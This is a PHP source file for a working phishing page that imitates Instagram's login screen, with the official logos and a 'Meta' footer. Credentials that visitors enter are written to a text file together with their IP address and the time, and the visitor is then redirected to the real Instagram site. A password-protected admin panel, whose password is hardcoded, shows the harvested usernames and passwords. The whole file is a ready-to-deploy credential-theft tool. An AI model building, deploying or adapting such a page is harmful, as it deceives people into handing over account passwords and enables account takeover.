<?php
session_start();

$filename = "credentials.txt";
$ip = $_SERVER['REMOTE_ADDR'];
$date = date("Y-m-d H:i:s");

// ----- Logout Logic -----
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: index.php");
    exit();
}

// ----- Delete Record Logic (Admin Only) -----
if (isset($_GET['delete']) && isset($_SESSION['admin'])) {
    $deleteIndex = (int)$_GET['delete'];
    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (isset($lines[$deleteIndex])) {
        unset($lines[$deleteIndex]);
        file_put_contents($filename, implode("\n", $lines) . (count($lines) ? "\n" : ""));
    }
    header("Location: ?admin=1");
    exit();
}

// ----- Update Description (Admin Only) -----
if (isset($_POST['update_desc']) && isset($_SESSION['admin'])) {
    $index = (int)$_POST['index'];
    $new_desc = trim($_POST['description'] ?? '');
    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (isset($lines[$index])) {
        $fields = explode(" | ", $lines[$index]);
        // Ensure the record has 5 fields (username, password, ip, date, description)
        while(count($fields) < 5){
            $fields[] = "";
        }
        $fields[4] = $new_desc;
        $lines[$index] = implode(" | ", $fields);
        file_put_contents($filename, implode("\n", $lines) . "\n");
    }
    header("Location: ?admin=1");
    exit();
}
if (isset($_GET['edit']) && isset($_SESSION['admin'])) {
    $index = (int)$_GET['edit'];
    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (isset($lines[$index])) {
        $fields = explode(" | ", $lines[$index]);
        
        $desc = isset($fields[4]) ? $fields[4] : "";
        echo "<!DOCTYPE html>
<html lang='en'>
<head>
  <meta charset='UTF-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
  <title>Edit Description</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f4f4f4; padding: 20px; }
    .edit-form {
      max-width: 500px; margin: auto; background: #fff; padding: 20px;
      border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);
    }
    label { display: block; margin-bottom: 8px; font-weight: bold; }
    textarea { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; }
    button { padding: 10px 20px; background: #007bff; color: #fff;
             border: none; border-radius: 4px; cursor: pointer; }
    button:hover { background: #0056b3; }
    a { display: inline-block; margin-top: 10px; color: #007bff; text-decoration: none; }
  </style>
</head>
<body>
  <div class='edit-form'>
    <h2>Edit Description for User Record</h2>
    <form method='POST'>
      <input type='hidden' name='index' value='$index' />
      <label for='description'>Description (optional):</label>
      <textarea name='description' id='description' rows='4'>$desc</textarea>
      <br/><br/>
      <button type='submit' name='update_desc' value='1'>Update Description</button>
    </form>
    <a href='?admin=1'>Back to Admin Panel</a>
  </div>
</body>
</html>";
        exit;
    } else {
        header("Location: ?admin=1");
        exit;
    }
}

// ----- Handle Login Submission -----
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Admin login
    if ($username === "admin" && $password === "zerocode@") {
        $_SESSION['admin'] = true;
        header("Location: ?admin=1");
        exit();
    } else {
    
        $entry = "$username | $password | $ip | $date | \n";
        file_put_contents($filename, $entry, FILE_APPEND);
        header("Location:https://www.instagram.com");
        exit();
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram</title>
  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" type="image/png"/>
  <style>
    /* Base styling */
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #fafafa;
    }
    .splash-screen {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: white;
      display: flex; justify-content: center; align-items: center;
      z-index: 999;
      transition: opacity 1s ease;
    }
    .splash-screen img { width: 200px; }
    .splash-screen.fade-out { opacity: 0; pointer-events: none; }
    .container {
      display: flex; flex-direction: column; align-items: center;
      margin-top: 50px;
    }
    .login-box {
      background: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 320px;
      text-align: center;
    }
    .login-box img { width: 175px; margin-bottom: 20px; }
    input {
      width: 100%;
      padding: 9px 8px;
      margin: 5px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
    }
    button {
      width: 100%;
      padding: 9px;
      background-color: #3897f0;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      margin-top: 10px;
      cursor: pointer;
    }
    .divider {
      display: flex; align-items: center; text-align: center;
      margin: 15px 0;
    }
    .divider::before, .divider::after {
      content: '';
      flex: 1;
      border-bottom: 1px solid #dbdbdb;
    }
    .divider:not(:empty)::before { margin-right: .75em; }
    .divider:not(:empty)::after { margin-left: .75em; }
    .facebook-login { color: #385185; font-weight: bold; margin: 10px 0; cursor: pointer; }
    .forgot { font-size: 12px; color: #00376b; margin-top: 12px; }
    .signup-box {
      margin-top: 15px;
      padding: 20px;
      background: #fff;
      border: 1px solid #dbdbdb;
      text-align: center;
    }
    .signup-box a { color: #0095f6; font-weight: bold; text-decoration: none; }
    footer {
      margin-top: 30px;
      font-size: 12px;
      color: #8e8e8e;
      text-align: center;
    }
    footer select {
      margin-top: 10px;
      padding: 5px;
      border: none;
      background: transparent;
    }

    /* Admin Panel Styling */
    .admin-container {
      max-width: 90%;
      margin: 30px auto;
      background: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
    }
    .admin-container h2 { text-align: center; color: #495057; }
    .admin-container a.logout {
      display: inline-block;
      background: #dc3545;
      color: #fff;
      padding: 8px 15px;
      text-decoration: none;
      border-radius: 5px;
      margin-bottom: 15px;
    }
    .admin-container table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 15px;
    }
    .admin-container th, .admin-container td {
      border: 1px solid #ccc;
      padding: 10px;
      text-align: center;
    }
    .admin-container th { background-color: #f5f5f5; }
    .admin-container td a {
      margin: 0 5px;
      text-decoration: none;
      color: #007bff;
    }
    .admin-container td a:hover { text-decoration: underline; }
    .disclaimer {
      margin-top: 20px;
      font-size: 13px;
      color: #666;
      text-align: center;
    }

    /* Responsive tweaks */
    @media screen and (max-width: 768px) {
      .login-box { width: 90%; padding: 20px; }
      .admin-container { padding: 15px; }
      table, thead, tbody, th, td, tr { display: block; }
      thead { display: none; }
      tr {
        margin-bottom: 15px;
        border: 1px solid #dee2e6;
        padding: 10px;
        background: #fff;
      }
      td {
        text-align: right;
        position: relative;
        padding-left: 50%;
      }
      td::before {
        position: absolute;
        left: 10px;
        top: 10px;
        white-space: nowrap;
        font-weight: bold;
        color: #495057;
      }
      td:nth-child(1)::before { content: "Username"; }
      td:nth-child(2)::before { content: "Password"; }
      td:nth-child(3)::before { content: "IP Address"; }
      td:nth-child(4)::before { content: "Date & Time"; }
      td:nth-child(5)::before { content: "Action"; }
    }
  </style>
</head>
<body>
  <div class="splash-screen" id="splash">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Splash Logo"/>
  </div>

  <?php if (!isset($_SESSION['admin'])): ?>
  <!-- Login Interface -->
  <div class="container">
    <div class="login-box">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram Logo"/>
      <form method="post">
        <input type="text" name="username" placeholder="Phone number, username, or email" required/>
        <input type="password" name="password" placeholder="Password" required/>
        <button type="submit">Log In</button>
      </form>
      <div class="divider">OR</div>
      <div class="facebook-login">Log in with Facebook</div>
      <div class="forgot">Forgot password?</div>
    </div>
    <div class="signup-box">
      Don't have an account? <a href="https://www.instagram.com/accounts/signup/phone/">Sign up</a>
    </div>
    <footer>
      <div>
        <select>
          <option>English</option>
          <option>Español</option>
          <option>Français</option>
          <option>Deutsch</option>
          <option>हिन्दी</option>
          <option>Português (Brasil)</option>
        </select>
      </div>
      © 2025 Instagram from Meta
    </footer>
  </div>
  <?php else: ?>
  <!-- Admin Panel -->
  <div class="admin-container">
    <h2>Admin Panel - Logged Credentials</h2>
    <a href="?logout=1" class="logout">Logout</a>
    <table>
      <thead>
        <tr>
          <th>Username</th>
          <th>Password</th>
          <th>IP Address</th>
          <th>Date & Time</th>
          <th>Action</th>
        </tr>
      </thead>
      <tbody>
        <?php
        if (file_exists($filename)) {
          $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
          foreach ($lines as $index => $line) {
          
            $fields = explode(" | ", $line);
            
            while(count($fields) < 5) { $fields[] = ""; }
            list($u, $p, $user_ip, $dt, $desc) = $fields;
            echo "<tr>
                    <td>$u</td>
                    <td>$p</td>
                    <td>$user_ip</td>
                    <td>$dt</td>
                    <td>
                      <a href='?edit=$index'>Desc</a> | 
                      <a href='?delete=$index' onclick='return confirm(\"Delete this record?\")'>Delete</a>
                    </td>
                  </tr>";
          }
        }
        ?>
      </tbody>
    </table>
    <div class="disclaimer">
      Yakozwe na <strong>2m_drill</strong><br/>
      Gukoresha nabi  iyi login page  ni icyaha gihanwa n’amategeko.
    </div>
  </div>
  <?php endif; ?>

  <script>
    window.addEventListener("load", () => {
      const splash = document.getElementById("splash");
      setTimeout(() => { splash.classList.add("fade-out"); }, 2000);
    });
  </script>
</body>
</html>